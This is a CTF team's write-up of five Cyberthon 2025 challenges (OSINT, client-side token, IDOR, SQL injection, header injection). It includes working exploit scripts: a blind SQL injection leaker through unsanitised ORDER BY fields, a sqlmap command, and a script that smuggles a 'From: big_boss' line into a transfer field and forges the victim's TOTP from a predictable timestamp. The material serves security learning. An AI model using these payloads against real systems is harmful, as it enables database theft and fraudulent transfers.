Our team managed to get 10th place for this event :D
Solves: Blog Bounty(osint), 🚩Flagtastic Fortune🚩(web), Ancient Atlas Archives(web), GPUPicker(web), Treasure Bank(web)
# Blog bounty
> "Imano Trealperson is an up-and-coming CTF player. He even has a secret blog with a Cyberthon flag published in one of the articles. Can you find it? All i've heard is that he hosts a number of websites on his personal domain besides his blog."

We are told about this "Imano Trealperson" person, so let's start cyberstalking him. A quick google/bing search will lead us to this site:
![[Pasted image 20250511115620.png]]
There, we see a single page with a link to his github.
![[Pasted image 20250511115742.png]]
I had tried to see if there was a GitHub page hosted at his account (http://imanotrp.github.io/) but unfortunately got nothing. Then, I checked out `robots.txt` and `sitemap.xml` but also got nothing. Getting desperate, I turned to DeepSeek and threw all the info I knew to it. One of its suggestions was checking certificate transparency logs using https://crt.sh/?q=flaghunt.ing
![[Pasted image 20250511120322.png]]
, which revealed a new subdomain
![[Pasted image 20250511120405.png]]
Visiting it and checking out the only [blog post](https://pwndiary.flaghunt.ing/blog/ctf-for-beginners), we are greeted with the flag
![[Pasted image 20250511120538.png]]
`Cyberthon{W0W_Y0U_F0UND_MY_BL0G_4ND_FL4G_4M4Z1NG_J0B}`
# 🚩Flagtastic Fortune🚩
#langs/javascript 
We are given a website where we need to fill up a form to claim the flag (supposedly)
![[Pasted image 20250511122842.png]]
Randomly filling up the form, it tells us the details are incorrect while the network tab shows no http requests were sent, hinting this is probably a client-side challenge.
![[Pasted image 20250511123010.png]]
Checking the JavaScript, we see this interesting block of code
```js
...
            if (hash === "354648ad5e5c57b24edcd1e1d81179989da534541bc8b5ff9eccb2f67a059a8b") {
                
                fetch(`/api/claim-flag?token=${generateToken()}`)
                    .then(response => response.json())
                    .then(data => {
                        if (data.flag) {
                            alert(`Congrats ${fullName} you won a flag: ${data.flag}`);
                        } else {
                            alert(`Sorry ${fullName}, something went wrong!`);
                        }
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        alert(`Sorry ${fullName}, there was an error processing your request!`);
                    });
            }
...
```
It seems to check if some hashes match before sending a request to `/api/claim-flag` with a generated token. Calling `generateToken()`, we are given this long string
![[Pasted image 20250511123840.png]]
Giving it to the API, we are greeted by the flag
![[Pasted image 20250511123920.png]]
`Cyberthon{fr33_fl4g_g1v34w4y_sc4m_s1t3_1s_4_sc4m}`
# Ancient Atlas Archives
We have a page where we can view a bunch of posts (locations?)
![[Pasted image 20250511124133.png]]
Clicking a random post, we see each post seems to have a numerical id,
![[Pasted image 20250511124222.png]]
with the last (visible) post having an id of 15.
![[Pasted image 20250511124303.png]]
What if we just incremented the number?
![[Pasted image 20250511124340.png]]
Oh lol there's the flag.
`Cyberthon{F1ND1NG_4_FL4G_1N_TH3_L05T_C1TY_0F_G0LD}`
# GPUPicker
#langs/sql 
We are given a catalogue where we can find specific GPUs.
![[Pasted image 20250512123507.png]]
Here, we see we have the options to search for a GPU by name and sort it by a specific category. From burp, we see that sorting/searching will send a get request to the api with all the search fields
![[Pasted image 20250512123734.png]]
What if we modify `sort_by` to be a non-existent category?
![[Pasted image 20250512123836.png]]
Woah, a detailed error shows up, telling us the exact SQL command executed too!
```json
{"error":"Error executing query: no such column: lol\nQuery: \n\t\tSELECT id, name, image_url, architecture, cuda_cores, boost_clock, boost_clock_unit,\n\t\t\t   memory, memory_unit, memory_bandwidth, memory_bandwidth_unit, dlss,\n\t\t\t   ray_tracing_cores, tensor_cores, nvenc, nvdec\n\t\tFROM gpus\n\t\tWHERE name LIKE ? AND name != 'RGB 6090'\n\t\tORDER BY lol asc\n\t\tLIMIT ? OFFSET ?\n\t\nParameters: [%, 9, 0]"}
```
It seems that while `page` and `per_page` are parameterized, `sort_by` and `sort_order` aren't. Also interestingly, there seems to be an additional condition to always skip the RGB 6090, hinting perhaps that is the gpu we want to get info about.
![[Pasted image 20250512130310.png]]
Further tests also reveal that those fields aren't sanitized, meaning we are free to perform SQL injection.
![[Pasted image 20250512130622.png]]
Giving the entire error message to DeepSeek, it suggests using a conditional when to leak information bit by bit
![[Pasted image 20250512131110.png]]
While the payload isn't perfect, we can use it as a starting point. Firstly, I chose to use `INSTR()` instead of `SUBSTR` as SQL is case-insensitive when doing equality comparisons. In contrast, `INSTR()` will match exactly as we provide. Next, we can cook up a quick leaking script, checking the order of items returned as an oracle to see if the given query was true. Here, the payload is crafted such that `RTX 4060 Ti` being first means true while `RTX 4060` being first means false.
```python
import httpx
import asyncio
import string

url = "http://chals.f.cyberthon25.ctf.sg:50131"

chars = string.ascii_letters + string.digits + string.punctuation
chars = chars.replace("'", "").replace("#", "")
# chars = "b"
# chars = ["RGB"]

async def attempt(c: httpx.AsyncClient, sort_by="name", sort_order="asc"):
    res = await c.get(f"{url}/api/gpus?sort_by={sort_by}&sort_order={sort_order}&page=1&per_page=2&search=RTX 4060")
    data = res.json()
    if "error" in data:
        print(f"Err: {data['error']}")
        print(f"Payloads:\n{sort_by}\n{sort_order}")
        return False
    matched = "Ti" in data["data"][0]["name"]
    return matched

async def main():
    async with httpx.AsyncClient() as client:
        cur = ""
        while True:
            queue = []
            for char in chars:
                tmp = cur+char
                order_payload = f"* (CASE WHEN (SELECT INSTR(architecture, '{cur+char}') FROM gpus WHERE name='RGB 6090')=1 THEN -1 ELSE 1 END)"
                sort_payload = f"CASE WHEN (SELECT INSTR(architecture, '{cur+char}') FROM gpus WHERE name='RGB 6090') = 1 THEN architecture ELSE name END"
                # queue.append(attempt(client,sort_by="cuda_cores", sort_order=order_payload))
                queue.append(attempt(client,sort_by=sort_payload, sort_order="asc"))

            queue = await asyncio.gather(*queue)
            cur += chars[queue.index(True)]
            print(cur)
            # return

asyncio.run(main())
```
From there, we can slowly leak the characters of the flag in the RGB 6090 after checking every single field (In this case, the flag was hidden in `architecture`)
`Cyberthon{M04R_AYY_E11_4ND_RGB_M34N5_B33G_FP5_1NCR3453}`
> Interestingly, on the competition day itself `sort_by` refused to work for whatever reason. Instead, DeepSeek suggested this interesting trick to control the sort order using `ASC`/`DESC` in numerical values
> ![[Pasted image 20250512134627.png]]

### The cheese method(?)
As it turns out, when 0 sanitization or processing is being done on your payload and the returned response from the server is not complex, sqlmap is able to brute force the entire solve process for you.
```bash
sqlmap -a --url="http://chals.f.cyberthon25.ctf.sg:50131/api/gpus?sort_by=boost_clock&sort_order=asc&page=1&per_page=9" --risk=3 --level=5 --threads=5
```
![[Pasted image 20250512140142.png]]
# Treasure bank
#langs/python 
We have a bank simulator app where our goal is to obtain an impossibly large amount of money to claim the flag. Reviewing the source, code we see the docker compose file contains 2 services to be run:
```yml
services:
  bank:
    build: bank
    ports:
      - "33339:5000"
  bank-kit:
    build: bank-kit
```
Let's check out the bank first. As seen, there is a `/flag` route that requires us to have in our account
```python
...
@app.route('/flag')
@login_required
def get_flag():
    balance = do_balance(session['username'])
    if balance is None:
        session.clear()
        flash("Your account has expired! Please make a new one!", "danger")
        return redirect(url_for('register'))
    if balance >= 1000000:
        return render_template('flag.html', flag=flag)
    return redirect(url_for('dashboard'))
...
```
Given that we need money, we must first find functions that are related to it.
There is also the `/transfer` endpoint, which seems to transfer money from you to someone else
```python
@app.route('/transfer', methods=('POST',))
@login_required
def transfer():
    to_username = request.form.get("to", None)
    amount = request.form.get("amount", None)
    otp = request.form.get("otp", None)

    if not do_transfer(session['username'], to_username, amount, otp):
        flash("Transfer failed!", "danger")
    else:
        flash("Transfer success!", "success")
    return redirect(url_for('dashboard'))
```
But wait, what exactly are these `do_balance` and `do_transfer` methods? We find they are defined in a file `util.py` and they seem to be communicating with the other docker service through sockets.
```python
import socket

HOST, PORT = "bank-kit", 8888


def do_register(name):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    msg = f"Register\n{name}\n".encode()

    sock.sendall(msg)
    recv = sock.recv(1024)
    if recv.startswith(b"Failed"):
        return
    return recv.decode()


def do_balance(name):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    msg = f"Balance\n{name}\n".encode()

    sock.sendall(msg)
    recv = sock.recv(1024)
    if recv.startswith(b"Failed"):
        return
    return int(recv.decode())

def do_transfer(frm, to, amt, otp):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    msg = f"Transact\nFrom: {frm}\nTo: {to}\nAmount: {amt}\nCode: {otp}".encode()

    sock.sendall(msg)
    recv = sock.recv(1024)
    if recv.startswith(b"Failed"):
        return
    return recv.decode()
```
Perhaps we should review how the bank-kit processes the socket connections.
Firstly, I threw the entire source code of the app into DeepSeek for review, where it pointed out:
* The `bigboss_hack` function which sets the big_boss' a high balance whenever a transaction or registration was made and resets their transaction count to 0
```python
def bigboss_hack():  
    with lock:  
        with open("./secure.json") as f:  
            data = json.load(f)  
  
        if "big_boss" not in data:  
            return  
        data["big_boss"]["balance"] = pow(10, 9)  
        data["big_boss"]["transactions"] = 0  
  
        with open("./secure.json", "w") as f:  
            json.dump(data, f)
```
* The lack of input validation
* A potential race condition of a timing difference between checking the lock and modifying the file data.
Only the first point seemed somewhat useful(while obvious), so I decided to manually review the user creation and transaction functions. 
```python
def handle_register(lines):
    if not len(lines):
        return b"Failed"
    
    uname = lines[0].strip()
    
    secret = md5((uname + str(int(time.time()))).encode())

    with lock:
        with open("./secure.json") as f:
            data = json.load(f)

        if uname in data:
            return b"Failed"
        
        data[uname] = {
            "balance": 10,
            "secret": secret,
            "transactions": 0
        }

        with open("./secure.json", "w") as f:
            json.dump(data, f)

    bigboss_hack()
    
    return pyotp.TOTP(secret).provisioning_uri(name=f"{uname}@treasure.com", issuer_name="Treasure Bank").encode()
```
It seems each user starts with a balance of 10 and has their user data stored as a dictionary in the `secure.json` file.  The user also seems to have a secret hash generated from their username and the time of account creation. There doesn't seem to be anything else interesting, so let's look at the `handle_transact()` function instead
```python
def handle_transact(lines):
    req = dict(l.split(": ", maxsplit=1) for l in lines)
    if any(x not in req for x in ["From", "To", "Amount", "Code"]):
        return b"Failed"
    
    frm = req["From"]
    to = req["To"]
    amount = int(req["Amount"])
    otp = req["Code"]

    with lock:
        with open("./secure.json") as f:
            data = json.load(f)

        if frm not in data or to not in data:
            return b"Failed"
        
        frm_data = data[frm]
        to_data = data[to]

        totp = pyotp.TOTP(frm_data["secret"])
        if not totp.verify(otp, valid_window=1):
            return b"Failed"
        if amount <= 0:
            return b"Failed"
        if amount > 10_000:
            # Large transfers require manual approval
            return b"Failed"
        if frm_data["balance"] < amount:
            # Insufficient balance
            return b"Failed"
        if frm_data["transactions"] > 100:
            # Account flagged for too many transactions!
            return b"Failed"
        if to_data["transactions"] > 100:
            # Account flagged for too many transactions!
            return b"Failed"
        frm_data["transactions"] += 1
        to_data["transactions"] += 1
        frm_data["balance"] -= amount
        to_data["balance"] += amount

        with open("./secure.json", "w") as f:
            json.dump(data, f)

    bigboss_hack()
    
    return b"Success"
```
Here, it seems that the "header" lines are parsed into a dictionary and the `frm`, `to`, `amount` and `otp` headers are extracted. However, there is something very suspicious here. We are initializing a dictionary from an iterable of key-value pairs in each line. What would happen if there were multiple of each header? Let's quickly test this out
```python
dict([("a", 1), ("b", 2), ("a", 3)])
>> {'a': 3, 'b': 2}
```
It seems the most recent key-value pair is taken, meaning if we somehow snuck an extra `From: big_boss` header line, we could have the money sent from the big boss instead.
To confirm, let's go back to `util.py` and see how the socket request is made again.
```python
def do_transfer(frm, to, amt, otp):  
    """  
    msg = f"Transact\nFrom: {frm}\nTo: {to}\nAmount: {amt}\nCode: {otp}".encode()    """    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    sock.connect((HOST, PORT))  
    # TODO No username validation, we can sneak in new headers  
    msg = f"Transact\nFrom: {frm}\nTo: {to}\nAmount: {amt}\nCode: {otp}"  
    print(f"Socket data:\n{msg}")  
    msg = msg.encode()  
  
    sock.sendall(msg)  
    recv = sock.recv(1024)  
    if recv.startswith(b"Failed"):  
        print("Transfer failure")  
        print(recv.decode())  
        return  
    return recv.decode()
```
As `frm` is the first parameter, we can inject the extra `From:` header in any argument and have the server use that instead. Checking back to the `/transfer` endpoint, we can confirm no validation is done on our input, and we can freely inject newlines
```python
@app.route('/transfer', methods=('POST',))  
@login_required  
def transfer():  
    to_username = request.form.get("to", None)  
    amount = request.form.get("amount", None)  
    otp = request.form.get("otp", None)  
  
    if not do_transfer(session['username'], to_username, amount, otp):  
        flash("Transfer failed!", "danger")  
    else:  
        flash("Transfer success!", "success")  
    return redirect(url_for('dashboard'))
```
Now, all we need to do is siphon money out of the big boss account into ours. As it seems, all we need to do is transfer $10000 \* 100 times to obtain the target amount of money.
```python
import httpx  
import asyncio  
  
url = "http://127.0.0.1:33339"  
  
async def transfer(client: httpx.AsyncClient, username, otp):  
    res = await client.post(f"{url}/transfer", data={"to": f"{username}\nFrom:big_boss", "amount": "10000", "otp": otp})  
    return "Success" in res.text  
  
async def main():  
    async with httpx.AsyncClient() as client:  
        res = await client.post(f"{url}/login", data={"username": "someuser", "password": "someuser"})  
        print(res.text)  
        queue = []  
        otp = input("Enter OTP: ")  
        for i in range(100):  
            res = transfer(client, "someuser", otp)  
            queue.append(res)  
        queue = await asyncio.gather(*queue)  
        print(queue)  
  
  
asyncio.run(main())
```
And... nothing. I had initially thought perhaps the OTP was outdated and tried the script again. Then I realized as from the name, a **One time** Password is meant to be used only once. However, testing revealed that 0 transactions succeeded and a quick search (with the help of AI) showed that pyotp was only responsible for verifying an OTP, not making sure it had already been used.  Perhaps, we should go back to the transaction handling code and review it again.
```python
...
frm = req["From"]  
to = req["To"]  
amount = int(req["Amount"])  
otp = req["Code"]  
  
with lock:  
    with open("./secure.json") as f:  
        data = json.load(f)  
  
    if frm not in data or to not in data:  
        return b"Failed"  
    frm_data = data[frm]  
    to_data = data[to]  
  
    totp = pyotp.TOTP(frm_data["secret"])  
    if not totp.verify(otp, valid_window=1):  
        return b"Failed"
...
```
Oops. As it turns out, we need the boss's OTP token, not ours. How would we know what their token was though? Checking out `schema.sql`, we see this helpful line of code
```sql
INSERT INTO user (username, password, timestamp, activated) VALUES ("big_boss", "login_disabled", "2025-02-28 15:50:24", 1);
```
How helpful! All we need to do now is to generate the secret for the boss
```python
import time, hashlib, base64  
from datetime import datetime  
  
def md5(x):  
    return base64.b32encode(hashlib.md5(x).digest()).decode()  
datetime_str = "2025-02-28 15:50:24"  
# Parse the string into a datetime object  
dt = datetime.strptime(datetime_str, "%Y-%m-%d %H:%M:%S")  
# Convert to epoch time (Unix timestamp)  
epoch_time = int(time.mktime(dt.timetuple()))  
print(f"Epoch timestamp: {epoch_time}")  
username = "big_boss"  
secret = md5((username + str(int(epoch_time))).encode())  
print(secret) #42II463B7OQ42MMLN3TGIZE5QI======
```
Now, we supply the boss's secret to pyotp and have it generate their OTP.
```python
import httpx  
import pyotp  
import asyncio  
  
url = "http://127.0.0.1:33339"  
url = "http://chals.f.cyberthon25.ctf.sg:50111"  
  
async def transfer(client: httpx.AsyncClient, username, otp):  
    res = await client.post(f"{url}/transfer", data={"to": f"{username}\nFrom: big_boss", "amount": "10000", "otp": otp})  
    return "Success" in res.text  
  
async def main():  
    async with httpx.AsyncClient() as client:  
        res = await client.post(f"{url}/login", data={"username": "someuser", "password": "someuser"})  
        print(res.text)  
        # client.cookies.set("session", input("Session token"))  
        queue = []  
        # otp = input("Enter OTP: ")  
        totp = pyotp.TOTP("42II463B7OQ42MMLN3TGIZE5QI======")  
        otp = totp.now()  
        for i in range(100):  
            res = transfer(client, "someuser", otp)  
            queue.append(res)  
        queue = await asyncio.gather(*queue)  
        print(queue)  
  
  
asyncio.run(main())
```
With that, we have enough money and can buy the flag
![[Pasted image 20250516225046.png]]
![[Pasted image 20250516224919.png]]
`Cyberthon{time_t0_g3t4w4y_w1th_th3_l00t}`